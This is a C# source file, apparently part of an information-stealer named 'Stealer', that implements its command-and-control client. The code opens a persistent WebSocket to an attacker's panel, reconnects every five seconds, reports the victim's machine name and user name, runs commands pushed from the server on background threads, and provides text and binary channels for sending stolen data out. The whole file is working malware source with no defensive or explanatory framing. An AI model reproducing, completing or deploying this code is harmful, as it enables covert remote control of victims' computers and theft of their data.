using System;
using System.IO;
using System.Net.WebSockets;
using System.Text;
using System.Threading;

namespace Stealer.Utils
{
    public static class C2Client
    {
        private static ClientWebSocket _ws;
        private static readonly object _sendLock = new object();
        private static Action<string> _onCommand;
        private static readonly string Log = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "whm_ws.log");

        private static void L(string msg)
        {
            try { File.AppendAllText(Log, DateTime.Now + " " + msg + "\r\n"); } catch { }
        }

        public static void Connect(string clientId, Action<string> onCommand)
        {
            _onCommand = onCommand;

            while (true)
            {
                try
                {
                    _ws = new ClientWebSocket();
                    string baseUrl = GetBaseUrl();
                    string wsUrl = baseUrl.Replace("https://", "wss://").Replace("http://", "ws://") + "/api/c2/ws";
                    L("CONNECTING: " + wsUrl);

                    _ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None).GetAwaiter().GetResult();
                    L("CONNECTED OK");

                    string auth = "{\"type\":\"auth\",\"client_id\":\"" + Escape(clientId) +
                                  "\",\"key\":\"" + Escape(Config.SecretKey) +
                                  "\",\"hostname\":\"" + Escape(Environment.MachineName) +
                                  "\",\"username\":\"" + Escape(Environment.UserName) + "\"}";
                    SendText(auth);
                    L("AUTH SENT");

                    ReceiveLoop();
                    L("RECEIVE LOOP ENDED, state=" + (_ws != null ? _ws.State.ToString() : "null"));
                }
                catch (Exception ex)
                {
                    L("CONNECT ERR: " + ex.GetType().Name + ": " + ex.Message);
                }

                try { _ws.Dispose(); } catch { }
                _ws = null;
                Thread.Sleep(5000);
            }
        }

        private static void ReceiveLoop()
        {
            var buffer = new byte[8192];
            while (_ws != null && _ws.State == WebSocketState.Open)
            {
                try
                {
                    var seg = new ArraySegment<byte>(buffer);
                    var result = _ws.ReceiveAsync(seg, CancellationToken.None).GetAwaiter().GetResult();

                    if (result.MessageType == WebSocketMessageType.Close)
                        break;

                    if (result.MessageType == WebSocketMessageType.Text)
                    {
                        var sb = new StringBuilder();
                        sb.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
                        while (!result.EndOfMessage)
                        {
                            result = _ws.ReceiveAsync(seg, CancellationToken.None).GetAwaiter().GetResult();
                            sb.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
                        }

                        string msg = sb.ToString();
                        string type = ParseJsonKey(msg, "type");

                        if (type == "command")
                        {
                            string cmd = ParseJsonKey(msg, "command");
                            if (!string.IsNullOrEmpty(cmd) && _onCommand != null)
                            {
                                new Thread(() => { try { _onCommand(cmd); } catch { } })
                                { IsBackground = true }.Start();
                            }
                        }
                        else if (type == "ping")
                        {
                            SendText("{\"type\":\"pong\"}");
                        }
                    }
                }
                catch { break; }
            }
        }

        public static void SendText(string text)
        {
            lock (_sendLock)
            {
                if (_ws == null || _ws.State != WebSocketState.Open) return;
                var bytes = Encoding.UTF8.GetBytes(text);
                _ws.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None)
                    .GetAwaiter().GetResult();
            }
        }

        public static void SendBinary(byte[] data)
        {
            lock (_sendLock)
            {
                if (_ws == null || _ws.State != WebSocketState.Open) return;
                _ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Binary, true, CancellationToken.None)
                    .GetAwaiter().GetResult();
            }
        }

        private static string Escape(string s)
        {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string ParseJsonKey(string json, string key)
        {
            string search = "\"" + key + "\":\"";
            int start = json.IndexOf(search);
            if (start < 0) return null;
            start += search.Length;
            int end = json.IndexOf("\"", start);
            if (end <= start) return null;
            return json.Substring(start, end - start);
        }

        private static string GetBaseUrl()
        {
            Config.Initialize();
            string url = Config.PanelUrl.TrimEnd('/');
            int idx = url.LastIndexOf("/api/upload");
            if (idx > 0) url = url.Substring(0, idx);
            return url;
        }
    }
}
